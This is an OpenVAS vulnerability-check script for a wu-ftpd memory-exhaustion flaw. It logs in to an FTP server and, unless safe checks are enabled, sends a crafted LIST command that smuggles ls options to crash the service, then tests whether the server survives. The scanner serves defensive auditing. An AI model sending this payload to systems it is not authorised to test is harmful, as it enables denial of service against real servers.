###############################################################################
# OpenVAS Vulnerability Test
# $Id: wuftpd_ls_DoS.nasl 13610 2019-02-12 15:17:00Z cfischer $
#
# wu-ftpd ls -W memory exhaustion
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
# HD Moore suggested fixes and the safe_checks code.
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:washington_university:wu-ftpd";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11912");
  script_version("$Revision: 13610 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-12 16:17:00 +0100 (Tue, 12 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(8875);
  script_cve_id("CVE-2003-0853", "CVE-2003-0854");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("wu-ftpd ls -W memory exhaustion");
  script_category(ACT_MIXED_ATTACK);
  script_family("FTP");
  script_copyright("Copyright (C) 2003 Michel Arboi");
  script_dependencies("gb_wu-ftpd_detect.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("wu-ftpd/installed");

  script_xref(name:"URL", value:"http://www.guninski.com/binls.html");

  script_tag(name:"summary", value:"The FTP server does not filter arguments to the ls command.

  It is possible to consume all available memory on the machine
  by sending

  ls '-w 1000000 -C'");

  script_tag(name:"solution", value:"Contact your vendor for a fix.");

  script_tag(name:"qod_type", value:"remote_banner");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("ftp_func.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! loc  = get_app_location( cpe:CPE, port:port ) ) exit( 0 ); # To have a reference to the Detection-NVT

kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );
if( ! ftp_authenticate( socket:soc, user:user, pass:pass ) ) exit( 0 );

port2 = ftp_pasv( socket:soc );
if( ! port2 ) {
  ftp_close( socket:soc );
  exit( 0 );
}

soc2 = open_sock_tcp( port2, transport:ENCAPS_IP );

if( ! soc2 ) {
  send( socket:soc, data:'LIST -ABCDEFGHIJKLMNOPQRSTUV\r\n' );
  r1 = ftp_recv_line( socket:soc );

  if( egrep( string:r1, pattern:"invalid option|usage:", icase:TRUE ) )
    security_message( port:port );

  if( soc2 ) close( soc2 );
  ftp_close( socket:soc );
  exit( 0 );
}

if( safe_checks() ) exit( 0 );

start_denial();

send( socket:soc, data:'LIST "-W 1000000 -C"\r\n' );
r1 = ftp_recv_line( socket:soc );
l  = ftp_recv_listing( socket:soc2 );
r2 = ftp_recv_line( socket:soc );
close( soc2 );
ftp_close( socket:soc );

alive = end_denial();
if( ! alive ) {
  security_message( port:port );
  exit( 0 );
}

if( egrep( string:r2, pattern:"exhausted|failed", icase:TRUE ) ) {
  security_message( port:port );
  exit( 0 );
}

soc = open_sock_tcp( port );
if( ! soc || ! ftp_authenticate( socket:soc, user:user, pass:pass ) )
  security_message( port:port );

if( soc ) ftp_close( socket:soc );
